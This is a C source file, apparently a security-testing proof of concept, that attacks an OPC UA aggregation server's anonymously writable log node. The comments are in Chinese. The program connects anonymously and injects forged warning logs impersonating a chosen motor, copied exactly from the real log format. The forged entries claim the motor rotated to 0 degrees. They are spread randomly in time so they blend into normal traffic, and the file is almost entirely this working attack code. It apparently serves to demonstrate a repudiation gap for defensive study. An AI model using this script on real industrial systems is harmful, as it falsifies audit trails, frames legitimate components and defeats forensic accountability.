// =============================================================================
// STRIDE - R (Repudiation / 否認) 攻擊 PoC ── 場景：偽造他人操作
// =============================================================================
// 目標：aggregation_server@4840 的 CentralLogIn（匿名可寫的 log 寫入口）。
//
// 否認(Repudiation)的定義：某個操作被記錄下來，但事後「無法追究是誰做的」，
//   因為系統缺乏來源身分綁定 / 簽章 / 可信時間戳，讓行為者能否認、或讓無辜者
//   被冤枉。
//
// 本系統為何脆弱（關鍵）：aggregation_server 的 central_log_append() 只把收到的
//   log 字串「原封不動」存進 ring buffer，唯一附加的是 server 自己遞增的 seq。
//   它『完全不記錄這行 log 是哪個 session / 哪個來源寫的』；CentralLogIn 又是
//   匿名可寫（ClientUserId ""）。→ 攻擊者冒充 motor 寫的 log，存進去後與『真正
//   motor 寫的』在位元上完全一致，事後鑑識無任何欄位可區分。
//
// 本 PoC（偽造他人操作）：冒充 motor 寫入一條看似完全合法的「馬達動作」log，
//   宣稱馬達執行了某個危險動作（例如把馬達轉到 0 度 / 宣稱因為距離太近）。
//   事後若追查「馬達為何做了這個動作」，log 指向 motor，但：
//     (a) 真正的 motor 從沒做過這個動作（是攻擊者捏造的）；
//     (b) 沒有任何證據能證明這行『不是』motor 寫的。
//   → motor 無法自證清白、攻擊者可完全否認 = Repudiation 成立。
//
// 對照：一個有防護的系統會在 log 綁定「已驗證的來源身分」+「簽章」，讓偽造行
//   在鑑識時立刻露餡。本 PoC 的價值就是凸顯這個缺口。
//
// ⚠️ 僅用於你自己機器上、你自己系統的授權安全測試。
// =============================================================================
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <open62541/client_config_default.h>
#include <open62541/client_highlevel.h>

// ---- 可調參數 ----
#ifndef N_FORGE
#define N_FORGE       3      // 整段共偽造幾筆「他人操作」log
#endif
#ifndef BASELINE_SEC
#define BASELINE_SEC  300    // 潛伏總時長（秒），與其他攻擊一致
#endif

static volatile UA_Boolean running = true;
static void stopHandler(int sig) { (void)sig; running = false; }

// 組出與真實 customLogger 輸出格式完全相同的一行 log。
static void build_log(char *out, size_t outlen, const char *level,
                      const char *cat, const char *msg) {
    UA_DateTimeStruct dts = UA_DateTime_toStruct(UA_DateTime_now());
    snprintf(out, outlen, "[%04u-%02u-%02u %02u:%02u:%02u.%03u (UTC)] %s/%s\t%s",
             dts.year, dts.month, dts.day, dts.hour, dts.min, dts.sec,
             dts.milliSec, level, cat, msg);
}

static UA_StatusCode inject_log(UA_Client *client, const char *line) {
    UA_Variant v;
    UA_String s = UA_STRING((char *)line);
    UA_Variant_setScalar(&v, &s, &UA_TYPES[UA_TYPES_STRING]);
    return UA_Client_writeValueAttribute(client, UA_NODEID_STRING(1, "CentralLogIn"), &v);
}

int main(int argc, char **argv) {
    // 可選參數 motor_id（>=1）：冒充哪一台 motor 的操作 log。
    //   多 pair 拓樸下，repudiation 要能指定打哪一組 pair，否則偽造內容永遠自稱
    //   "Motor"（pair1），三份並行實例會全部堆在 pair1（見 collect_topo3.sh 的 $k）。
    //   motor_id=1 → SourceName "Motor"（與改造前一字不差）；i>=2 → "Motor<i>"。
    // ⚠ 只改『偽造內容自稱的身分』；SourceNode 仍由 server 蓋章為 unverified/null。
    int motor_id = 1;
    if (argc > 1) {
        motor_id = atoi(argv[1]);
        if (motor_id < 1) { fprintf(stderr, "用法: %s [motor_id>=1]\n", argv[0]); return 2; }
    }
    char srcname[32];
    if (motor_id == 1) snprintf(srcname, sizeof(srcname), "Motor");
    else               snprintf(srcname, sizeof(srcname), "Motor%d", motor_id);

    signal(SIGINT, stopHandler);
    signal(SIGTERM, stopHandler);

    UA_Client *client = UA_Client_new();
    UA_ClientConfig_setDefault(UA_Client_getConfig(client));

    printf("[REPUDIATE] Connecting to aggregation_server@4840 (anonymous)...\n");
    UA_StatusCode rc = UA_Client_connect(client, "opc.tcp://127.0.0.1:4840");
    if (rc != UA_STATUSCODE_GOOD) {
        printf("[REPUDIATE] Connect failed: %s\n", UA_StatusCode_name(rc));
        UA_Client_delete(client);
        return 1;
    }
    printf("[REPUDIATE] Connected as ANONYMOUS. Lurking %d s, sparsely forging %d\n",
           BASELINE_SEC, N_FORGE);
    printf("[REPUDIATE] 'motor action' logs that motor never performed.\n\n");

    srand((unsigned)time(NULL) ^ 0x1234);

    // 在 [0, BASELINE_SEC) 內隨機抽 N_FORGE 個「偽造時點」（秒），排序。
    // 稀疏散佈、不固定間隔，埋進正常流量裡（隱蔽）。
    int forge_at[N_FORGE];
    for (int i = 0; i < N_FORGE; i++) forge_at[i] = rand() % BASELINE_SEC;
    for (int i = 1; i < N_FORGE; i++) {
        int key = forge_at[i], j = i - 1;
        while (j >= 0 && forge_at[j] > key) { forge_at[j + 1] = forge_at[j]; j--; }
        forge_at[j + 1] = key;
    }

    time_t start = time(NULL);
    int next = 0;
    char line[1024], msg[256];

    while (running) {
        int elapsed = (int)(time(NULL) - start);
        if (elapsed >= BASELINE_SEC) break;

        while (next < N_FORGE && forge_at[next] <= elapsed) {
            // 偽造「馬達因距離太近轉到 0 度」的操作 log —— warn/application + [Motor] 前綴，
            // 與真實 motor 在「距離太近」時的輸出格式一字不差（見 motor_sub.c 的 UA_LOG_WARNING）。
            // 距離值用不同的亂數（每筆不同），避免多筆完全相同而被誤判成 replay；
            // 這是「偽造多個不同的假操作」，不是「重放同一筆」。
            double d = 2.0 + ((double)rand() / RAND_MAX) * (19.0 - 2.0); // < SAFE_DISTANCE=20
            snprintf(msg, sizeof(msg),
                     "[Motor] Distance too close (%.1f); rotating motor to 0 degrees", d);
            build_log(line, sizeof(line), "warn", "application", msg);
            // 附上與真實 motor 完全相同的 LogRecord 後綴（見 motor_sub.c 的 full_log），
            // warn 級距 Severity=175、EventType=application，SourceName 指向目標 pair。
            size_t L = strlen(line);
            snprintf(line + L, sizeof(line) - L,
                     " | Severity=175 | SourceName=%s | EventType=application", srcname);
            if (inject_log(client, line) == UA_STATUSCODE_GOOD)
                printf("[REPUDIATE] t=%ds FORGED (impersonating %s): %s\n", elapsed, srcname, line);
            else
                printf("[REPUDIATE] t=%ds write failed.\n", elapsed);
            next++;
        }

        UA_Client_run_iterate(client, 0);
        usleep(200000);
    }

    printf("[REPUDIATE] Done (%d/%d forged; attacker leaves no attributable trace).\n", next, N_FORGE);
    UA_Client_disconnect(client);
    UA_Client_delete(client);
    return 0;
}
